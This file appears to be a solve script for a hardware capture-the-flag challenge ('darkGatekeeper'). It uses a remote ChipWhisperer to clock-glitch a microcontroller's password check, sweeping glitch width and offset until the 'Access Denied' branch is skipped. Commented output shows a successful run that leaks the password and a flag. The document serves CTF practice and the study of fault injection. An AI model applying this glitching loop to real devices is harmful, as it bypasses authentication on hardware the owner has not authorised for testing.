from pathlib import Path
import sys

# Adding parent directory to the path to access utils
sys.path.insert(0, str(Path(__file__).resolve().parents[1]))

from utils.remote_cw import remote_cw, RemoteConfig
from utils.helper_cv import setup_cw, cap_pass_trace, plot_traces, PLATFORM, interact, reboot_flush, upload_firmware
import numpy as np
import matplotlib.pyplot as plt
from rpyc.utils.classic import obtain

cfg = RemoteConfig(
    host="remotechipwhisperer.example", # replace with hostname of the remote pi or its IP address
    user="pi",
    key_filename="path/to/your/priv_key", # replace with your private key path
    port=18812,                  # must match the rpyc_classic on the Pi
    connect_host="127.0.0.1",    # local end (your machine)
    remote_host="127.0.0.1",     # remote rpyc_classic bind address
)

CHALLENGE_NAME = "darkGatekeeper"

# python -u solve.py | tee out.txt

def main():
    with remote_cw(cfg) as cw:
        # This runs on the REMOTE machine inside the venv!
        scope, target, prog = setup_cw(cw,cw.scope())
        # print(help(scope))
        # help(scope.glitch)
        # print(help(target))

        # Setting up the scope for capturing
        scope.adc.samples = 1000
        BAUD = target.baud
        CLOCK = scope.io.clkout
        NEWCLOCK = 24e6
        scope.io.clkout = NEWCLOCK
        NEWCLOCK = scope.io.clkout
        target.baud = BAUD * NEWCLOCK / CLOCK
        scope.adc.clk_freq = 7500000.0
        # print(f"[+] Changed baud rate from {BAUD} to {target.baud}")
        # print(f"[+] Changed clkout from {CLOCK} to {NEWCLOCK}")

        upload_firmware(cw, scope, prog, CHALLENGE_NAME)

        # target.simpleserial_write('a', b'7N4>qp14c70!aaaa')
        # # val = target.simpleserial_read_witherrors('r', 18, glitch_timeout=10, timeout=50)#For loop check
        # val = target.simpleserial_read('r', 18, timeout=5)#For loop check
        # if val is not None:
        #     print(val)

        # return

        #  GLITCH SETTINGS ------------------------------------------------------------------------------------------------------
        
        #TRIES = 1
        gc = cw.GlitchController(groups=["success", "reset", "normal"], parameters=["repeat", "ext_offset", "tries"])
        gc.set_range("tries", 1, 10)
        gc.set_range("ext_offset", 5,40)
        gc.set_range("repeat", 2, 4) # sarebbe la width per CWNANO

        gc.set_global_step(1)

        #  GLITCH LOOP ------------------------------------------------------------------------------------------------------

        #disable logging
        cw.set_all_log_levels(cw.logging.CRITICAL)

        # scope.adc.timeout = 0.5

        reboot_flush(scope, target)

        resets = 0
        for glitch_setting in gc.glitch_values():

            # glitch_setting is (repeat, ext_offset, tries) 

            scope.glitch.repeat = glitch_setting[0]
            scope.glitch.ext_offset = glitch_setting[1]
            try_num = glitch_setting[2]
            print(f"resets = {resets} -- repeat = {scope.glitch.repeat}, ext_offset = {scope.glitch.ext_offset}, # {try_num}", flush=True, end = ' -> ')


            #for _ in range(TRIES):
            scope.arm()

            #Do glitch loop
            target.simpleserial_write('a', b"asdfasdfasdf")
            
            ret = scope.capture()

            # scope.io.vglitch_reset() # CWNANO DOESN'T LIKE THIS
            if ret:
                #print('Timeout - no trigger')
                gc.add("reset")
                resets += 1

                #Device is slow to boot?
                reboot_flush(scope, target)

            else:
                val = target.simpleserial_read_witherrors('r', 18, glitch_timeout=10, timeout=50)#For loop check
                print(val['payload'], flush=True)
                if val['valid'] is False or val['payload'] is None:
                    gc.add("reset")
                    reboot_flush(scope, target)
                    resets += 1
                    #print(val)
                else:

                    if b"Access Denied....." not in val['payload'] or val['rv'] != 0: #for loop check
                        try:
                            print(f"Flag: {val['payload'].decode()}", flush=True)
                            gc.add("success")
                            print(val)
                            print("SUCCESS", flush=True)
                            exit()
                        except:
                            pass
                    else:
                        gc.add("normal")

        print("Done")
        cw.set_all_log_levels(cw.logging.WARNING)


if __name__ == "__main__":
    main()

# resets = 4 -- repeat = 2, ext_offset = 17 -> bytearray(b'Access Denied.....')
# resets = 4 -- repeat = 2, ext_offset = 18 -> bytearray(b'Access Denied.....')
# resets = 4 -- repeat = 2, ext_offset = 19 -> bytearray(b'\xc3^\x1a\x88*\x18\xcf\xf6\x9b\x82\xf0d\xa6\xf2\r\xbc\x98\xe0')
# resets = 68 -- repeat = 4, ext_offset = 38 -> bytearray(b'7N4>qp14c70!\x00\x00\x00\x00Ac')
# Flag: 7N4>qp14c70!
# SUCCESS

# bytearray(b'ESC{J0lt_Th3_G473}')